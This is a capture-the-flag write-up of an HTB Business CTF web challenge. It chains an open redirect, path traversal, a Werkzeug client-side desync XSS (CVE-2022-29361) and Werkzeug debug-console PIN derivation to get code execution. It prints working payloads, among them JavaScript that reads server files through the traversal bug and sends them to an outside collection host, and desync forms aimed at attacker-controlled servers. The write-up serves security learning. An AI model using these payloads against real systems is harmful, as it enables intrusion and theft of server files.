Me and my friend (@0xbla) spent our weekend solving a very interesting challenge from HTB Business CTF

The challenge was very realistic and it required you to chain a lot of other bugs to solve it, probably the best one we have ever seen.


I will give you a basic idea about the challenge:

The application had basic login/signup flow
![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/f0ac9707-b786-423a-8f37-7d04237e3a5f)

Once logged in you were redirect to the `/settings` endpoint which allowed you to make changes to your profile: http://localhost:1337/settings

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/4746400e-81fa-4eba-af17-2f4ea3c4134b)

The Bio input field says that *Bio (limited HTML supported)* , so we will put some basic html tags and see if they are rendered or not `<i>shirley</i>` , there is also a file upload which only allows to upload png files.
Once we submit this form , we get this message: *Your profile is now public*

We can now visit our profile via this url : http://localhost:1337/profile/3
(The id 1,2 are reserved for other users probably admin)

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/7ae40860-a2f9-42e0-ae2e-a45b98387d36)

From the above screenshot you could see that the *Bio* field html code didn't worked although it said that basic html tags were allowed. I also tried some more tags but all of them weren't rendered.
On the right side you could see we have *Report a user* functionality where we could report any user profile by just supplying it's user id.


Going through burp history , I found this endpoint: http://localhost:1337/go?to=/login
It was found to be vulnerable to open redirect, let's add it to our note and move forward with the source code review part.

------------

# Source Code


The application is in python Flask and it is running in debug mode


```python
from application.main import app

app.run(host='0.0.0.0', port=1337, debug=True)
```

The flag is stored on the file system not exposed anywhere else so we might need a rce and also the location is random.

```bash
# change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 10).txt
```



The routes are defined here: /application/blueprints/routes.py

We can confirm the open redirect root cause from here:
```python
@web.route('/go')
def goto_external_url():
    return redirect(request.args.get('to'))
```

These one routes which isn't allowed to be access by normal user, looked interesting:

```python
@api.route('/ipc_download')
@is_authenticated
def ipc_download(user):
    if user['username'] != 'admin':
        return response('Unauthorized'), 401

    path = f'{os.path.join(current_app.root_path, current_app.config["UPLOAD_FOLDER"])}{request.args.get("file")}'
    try:
        with open(path, "rb") as file:
            file_content = file.read()
        return Response(file_content, mimetype='application/octet-stream')
    except:
        return response('Something Went Wrong!')


```

This endpoint is responsible for sending the response of the ipc document submitted during profile update but as there is no check on the file param `request.args.get("file")` we could path traverse and read any file we want.
We can't use this to read the flag directly as the flag has random name suffix to it and also this is only accessible by admin user.

If we want to read the response of this endpoint to read any file we would need a xss bu, which get's executed in the bot's browser so that we could access this endpoint and read the response.


The Upload IPC endpoint was also interesting:

```python
@api.route('/ipc_submit', methods=['POST'])
@is_authenticated
def ipc_submit(user):
    if 'file' not in request.files:
        return response('Invalid file!')
    
    ipc_file = request.files['file']

    if ipc_file.filename == '':
        return response('No selected file!'), 403
    
    if ipc_file and allowed_file(ipc_file.filename):
        ipc_file.filename = f'{user["username"]}.png'  # [1]
        ipc_file.save(os.path.join(current_app.root_path, current_app.config['UPLOAD_FOLDER'], ipc_file.filename)) # [2]
        update_ipc_db(user['username'])

        return response('File submitted! Our moderators will review your request.')
    
    return response('Invalid file! only png files are allowed'), 403
```

On line [1], you could see `ipc_file.filename` value is taken from the username (which is controllable by the user) and then directly used in `path.join` operation.

This is bad practise as it leads to path traversal here also

```python
>>> os.path.join('/home/ubuntu')
'/home/ubuntu'
>>> os.path.join('/home/ubuntu','sudi')
'/home/ubuntu/sudi'
>>> os.path.join('/home/ubuntu','/sudi')
'/sudi'
``` 

If the username is like this `/username` then os.path.join operation will return `/username` instead (it will ignore everything what's before) this would have allowed us to have arbitrary file write on the file system which we could we use to overwrite any template then get easy rce but as the application appends the extenion to it `f'{user["username"]}.png'` we can't make use of this as we can;t do anything malicious by overwriting png files.



Examining the bot.py file we discover something:

The report endpoint takes the value from the id parameter but as there is no checks we can provide anything else also there.
```python
@api.route('/report', methods=['POST'])
@is_authenticated
def report(user):
    if not request.is_json:
        return response('Missing required parameters!'), 401
    
    data = request.get_json()

    user_id = data.get('id', '')
```

bot.py

```python
    client.get(f"http://localhost:1337/login")

    time.sleep(3)
    client.find_element(By.ID, "username").send_keys(username)
    client.find_element(By.ID, "password").send_keys(password)
    client.execute_script("document.getElementById('login-btn').click()")
    time.sleep(3)
    client.get(f"http://localhost:1337/profile/{id}") // [3]
    time.sleep(10)
```

On line [3] you could see the `id` is directly added to the url , this again could lead to path traversal. This one is interesing as we could chain this with the open redirect bug.
Let me explain the bot was restricted to visit the profile page only but due to the path traversal and open redirect bug we could make the bot visit any page we want.

```json
{
    "id":"../go?to=https://atacker.com/"
}
```

This gave more of a hint that the xss bug can be on any page instead of just the profile page.


We we started looking at the client side javascript code, to look for any xss sink:


At first this looked interesting:

```js
const populateBots = () => {
    let sBots = $('.exp-container').data('botExp');

    let botsHTML = `<div class="row justify-content-center">`;

    for(i=0; i < botsData.length; i++) { // [4]
        if (sBots.includes(botsData[i].name)) {
            botsHTML += `
            <div class='col-md-3 bots-col'>
                <img src='${botsData[i].src}' class='bots-img'>
            </div>`;
        }
    }

    botsHTML += `</div>`;

    $('.exp-container').html(botsHTML);
}
```

[4] botsData is decalred inside this file http://localhost:1337/static/js/global.js

```js
window.botsData = [
    {
       "name":"DisBot",
       "src":"/static/images/bots/jake-parker-discord.png"
    }
```

As the source is directly used in the jquery html sink we thought if we can clobber `window.botsData` we could get xss.But we couldn't find any injection point.

Meanwhile my friend pointed out that the `/debug` endpoint has Werkzeug console exposed (as the application is running in debug mode), but we don't know the pin.

This is where we came up with a plan how to solve this challenge by chaining all the pieces we already have.



Searching on google we found this blog https://www.daehee.com/werkzeug-console-pin-exploit/, which explains how you can genrate the PIN if you have a path traversal bug.By following this we should be able to get the PIN


Here's how the attack will look:
Consider the xss endpoint to be `/xssendpoint`


In the report endpoint, modify the id parameter in the request to `../go?to=/xssendpoint` . This will redirect the bot to the page where we have xss.Using the  xss bug make a request to the `/api/ipc_download?file=../../../../etc/passwd` endpoint and get the response and sent it to our controlled server. (we will fetch the necessary information needed to generate the pin)

-------------

# XSS

We are still misisng an important piece to prove our attack , xss. At this point we were clueless then my friend pointed our that the challenge name relates *web desync* maybe we need to exploit this to get xss.
At that time we both remembered about seeing a new research by @kevin_mizu on *Abusing Client-Side Desync on Werkzeug* as we were dealing Werkzeug this looked very promising.

https://mizu.re/post/abusing-client-side-desync-on-werkzeug

Oxbla confirmed that it is ineeded vulnerable to desync attack. I was reading the research blog at that time as I am not good with this attack, the version mentioned in that blog was same as what was used in the challenge

requirements.txt
```
Flask==2.1.0
Werkzeug==2.1.0
```

https://nvd.nist.gov/vuln/detail/cve-2022-29361


Mizu really went deep into his research and even undercover an interesting open redirect to demonstrate how this bug could could be chained together which will lead to account takeover.

I won't go into the details as Mizu already explained everything very well in simple terms so make sure to read his research before continuing  


This is the open redirect which I am talking about :

```
GET http://google.com HTTP/1.1
Host: localhost:1337
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36


```

Response:

```
HTTP/1.1 308 PERMANENT REDIRECT
Server: Werkzeug/2.1.0 Python/3.11.4
Date: Mon, 17 Jul 2023 15:18:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 262
Location: http://google.com/?
```

Again check the research blog if you want to know the root cause of this.


By using a form such as this:

```html
<form id="x" action="http://localhost:1337/"
    method="POST"
    enctype="text/plain">
    <textarea name="GET https://attacker.com HTTP/1.1
    Foo: x">Mizu</textarea>
    <button type="submit">CLICK ME</button>
    </form>


<script> x.submit() </script>
```




![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/d13d01d6-84ca-4975-96f4-49e0c0796de5)


Upon submitting the above form this what happened:
![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/7fdfcc5b-4f7d-4c6b-b3b7-16bbef90c0f8)

*As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.*

Quoting this from Mizu's blog what's happening here is that the payload send in the request body is used in the next request


In our case the next request was made to http://localhost:1337/static/js/jquery.js , due to the bug in the parsing the request the server  instead of returning the original jquery.js code it returns a 308 redirect response to https://attacker.com (whatever code is returned by this server will be loaded in the page instead jquery.js) this give us a nice xss.


We can confirm this xss by adding this payload to our index.html file

```js
alert()
```


![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/4899cdfb-f18f-43bf-9c7b-61a01fbfad9d)


Great we have the xss now :)







Sample code to read any local file


index.html

```js
fetch('/api/ipc_download?file=../../../../etc/passwd', {
    credentials: 'include'
  })
    .then(response => response.text())
    .then(data => {
      const encodedData = btoa(data);
      const url = `https://en2celr7rewbul.m.pipedream.net/?flag=${encodedData}`;
      window.location.href = url;
    });
```

```
POST /api/report HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/json
Content-Length: 94

{
  "id": "../go?to=http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app/test.html"
}
```

test.html contents

```html
<form id="x" action="http://localhost:1337/"
    method="POST"
    enctype="text/plain">
    <textarea name="GET http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app HTTP/1.1
    Foo: x">Mizu</textarea>
    <button type="submit">CLICK ME</button>
    </form>


<script> x.submit() </script>
```

![image](https://user-images.githubusercontent.com/31372554/254163199-24f67c10-a553-4cf4-a363-36eea20310d5.png)


----------------------

To generate the PIN value on our end we need to know some values beforehand:

https://www.daehee.com/werkzeug-console-pin-exploit/

If you are interested in checking the source which generates the pin here it is: https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L138

We will be using this script to generate the pin: https://github.com/wdahlenburg/werkzeug-debug-console-bypass


As we have alocal setup most of the things we already know:

>username is the user who started this Flask
root

>modname
flask.app

>getattr(app, '__name__', getattr (app .__ class__, '__name__'))
Flask
>getattr(mod, '__file__', None) #is the absolute path of an app.py in the flask directory
/usr/local/lib/python3.11/site-packages/flask/app.py

>uuid.getnode()

```bash
$ cat /sys/class/net/eth0/address 
02:42:ac:11:00:04
root@9d0ff0081967:/app# python3
Python 3.9.7 (default, Sep  3 2021, 02:02:37) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "".join("02:42:ac:11:00:04".split(":"))
'0242ac110004'
>>> print(0x0242ac110004)
2485377892356

```

get_machine_id() 

Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
With the path traversal we can easily read the values of these files


Here's the final payload to get all the required info:


```js
""
files = ["/sys/class/net/eth0/address","/proc/sys/kernel/random/boot_id","/proc/self/cgroup"]




// loop through files fetch and send to server

files.forEach(file => {
    fetch(`/api/ipc_download?file=../../../../${file}`, {
        credentials: 'include'
    }).then(response => response.text())
        .then(data => {
            const encodedData = btoa(data);
            const url = `https://en2celr7rewbul.m.pipedream.net/?flag=${encodedData}`;
            fetch(url);
        });
});
```


/sys/class/net/eth0/address

```
>>> "".join("02:42:ac:11:00:02".split(":"))
'0242ac110002'
>>> print(0x0242ac110002)
2485377892354
```

/proc/sys/kernel/random/boot_id

```
d2ad6c68-ebf1-4090-85ff-60e0b7c2fb86
```

/proc/self/cgroup

```
12:blkio:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
11:cpuset:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
10:freezer:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
```

machine id => 

```
d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
```

/etc/machine_id can be ignored as this file doesn't exist on our challenge server.

```python
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892354',# str(uuid.getnode()),  /sys/class/net/ens33/address 
    # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
    'd2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a'
]
```

Now run the script werkzeug-pin-bypass.py and you will have the pin


You can see here that they are indeed same :)
![image](https://user-images.githubusercontent.com/31372554/254167983-a0a1401b-cf80-4e17-b17f-94f8f1cb1635.png)


0xbla did all this scripting work in no time so thanks to him we were able to complete this challenge in no time.


And at last we had the flag

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/02eb4516-ef05-41ea-b9fc-2e36755ddd85)


